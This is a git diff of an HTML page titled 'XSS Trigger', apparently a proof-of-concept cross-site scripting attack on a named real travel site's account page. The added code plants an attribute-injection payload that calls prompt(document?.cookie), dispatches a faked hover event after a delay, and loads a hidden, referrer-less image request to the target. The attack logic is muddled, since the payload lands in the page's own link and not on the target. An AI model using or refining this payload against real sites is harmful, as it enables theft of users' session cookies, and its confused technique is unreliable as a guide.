@@ -4,21 +4,30 @@
     <title>XSS Trigger</title>
 </head>
 <body>
-    <a href="https://travelpirates.hometogo.com/account/><>" id="redirectLink" target="_blank">Click me to Redirect</a>
+    <a href="#" id="redirectLink">Click me to Redirect</a>
 
     <script>
     document.addEventListener("DOMContentLoaded", function() {
-        document.getElementById("redirectLink").click();
+        document.getElementById("redirectLink").addEventListener("click", function() {
+            var img = new Image();
+            img.src = "http://travelpirates.hometogo.com/account/";
+            img.setAttribute("style", "display:none;");
+            img.setAttribute("referrerpolicy", "no-referrer");
+            document.body.appendChild(img);
+        });
+        
+        // Simulate the hover event after a delay
+        setTimeout(function() {
+            var hoverEvent = new Event("mouseover");
+            var link = document.getElementById("redirectLink");
+            
+            // Add your payload to the link's innerHTML
+            link.innerHTML = 'tester90?><>><<x12 only=xxxxx onpointermove=prompt(document?.cookie)>hover-here-for-xss';
+            
+            // Dispatch the hover event
+            link.dispatchEvent(hoverEvent);
+        }, 5000);
     });
-    
-    // Add a delay to ensure the redirect happens before the XSS payload
-    setTimeout(function() {
-        var img = new Image();
-        img.src = "https://travelpirates.hometogo.com/account/><>";
-        img.setAttribute("style", "display:none;");
-        img.setAttribute("referrerpolicy", "no-referrer");
-        document.body.appendChild(img);
-    }, 5000);
     </script>
 </body>
 </html>
